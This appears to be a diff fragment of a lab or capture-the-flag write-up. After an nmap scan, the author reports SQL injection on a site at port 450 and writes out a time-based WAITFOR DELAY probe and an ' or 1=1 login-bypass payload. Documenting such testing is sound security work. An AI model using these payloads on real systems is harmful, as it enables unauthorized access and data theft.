@@ -76,3 +76,18 @@ OS and Service detection performed. Please report any incorrect results at https
 # Nmap done at Sun Feb 27 04:58:51 2022 -- 1 IP address (1 host up) scanned in 477.73 seconds
 
 ```
+
+I find the website that runs on port 450 has SQL injection vulnerability by using the waiting test.
+
+```SQL
+'; WAITFOR DELAY '00:00:10' ; --
+```
+![image](1)
+
+Attempts to log in using the usernames ```admin``` and ```administrator``` failed.
+
+```SQL
+' or 1=1  ; -- #password column
+```
+
+
